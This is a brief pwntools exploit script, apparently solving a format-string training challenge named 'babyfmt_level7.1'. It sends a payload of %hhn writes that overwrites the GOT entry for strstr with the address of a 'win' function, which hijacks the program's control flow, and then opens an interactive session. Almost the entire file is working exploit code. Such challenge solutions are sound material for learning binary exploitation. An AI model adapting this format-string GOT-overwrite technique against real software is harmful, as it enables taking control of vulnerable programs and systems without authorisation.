from pwn import * 

binary = './babyfmt_level7.1'

p = process(binary)

s = '''
b * printf
b * main+423
'''



#gdb.attach(p, s)

# 0x   c8c5   6078  8cd2  5937

win = 0x0040133d

strstr = 0x404088


payload = flat(
	"%61c%57$hhn",
	"%214c%58$hhn",
	"%45c%59$hhn",
	"%192c%60$hhn",
	"%256c%61$hhn",
	"%256c%62$hhn----------------------------------",
	p64(strstr),
	p64(strstr+1),
	p64(strstr+2),
	p64(strstr+3),
	p64(strstr+4),
	p64(strstr+5)
)
#gdb.attach(p, s)

p.sendline(payload)

time.sleep(1)

p.sendline("END")



p.interactive()
